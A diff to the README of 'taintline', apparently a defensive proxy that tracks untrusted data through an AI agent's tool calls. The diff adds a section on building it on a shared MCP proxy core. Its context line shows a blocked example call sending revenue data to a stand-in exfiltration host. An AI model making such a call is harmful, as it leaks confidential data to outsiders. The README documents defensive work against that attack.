@@ -82,6 +82,10 @@ BLOCKED  http.fetch(url="https://exfil.example/?d=Q3%20revenue...")
 4. Planner/executor mode for computed values
 5. Benchmark results and a paper
 
+## Built on switchyard
+
+`taintline` will be a Go binary built on [switchyard](https://github.com/sadayamuthu/switchyard), OpenAstra's shared MCP proxy core: proxy mode is a switchyard hook that labels tool outputs as they pass and blocks calls whose arguments carry untrusted data. It stacks with the other switchyard tools by chaining (`agent → fuse → intentlock → taintline → rewind → MCP server`).
+
 ## Related OpenAstra projects
 
 - [IntentLock](https://github.com/sadayamuthu/intentlock): limits *what* may be called; Taintline limits *what data* may drive it
